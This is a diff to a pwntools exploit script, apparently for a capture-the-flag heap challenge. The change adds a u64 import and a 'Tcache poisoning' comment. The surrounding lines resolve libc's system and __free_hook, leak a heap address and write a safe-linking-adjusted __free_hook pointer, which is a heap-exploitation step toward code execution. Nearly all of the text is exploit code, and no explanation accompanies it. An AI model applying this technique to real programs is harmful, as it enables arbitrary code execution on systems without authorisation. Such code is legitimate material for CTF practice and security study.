@@ -1,6 +1,5 @@
 from pwn import * 
-from pwn import p64
-
+from pwn import p64,u64
 
 debug = 1
 gdb_is = 0
@@ -58,7 +57,7 @@ system_addr = libc.sym['system']
 free_hook = libc.sym['__free_hook']
 print(f'free_hook = {hex(free_hook)}')
 print(f'system_addr = {hex(system_addr)}')
-
+# Tcache poisoning
 show_note(0)
 heap=u64(r.recv(5)+b'\x00\x00\x00')
 edit_note(6,p64(free_hook ^ heap))
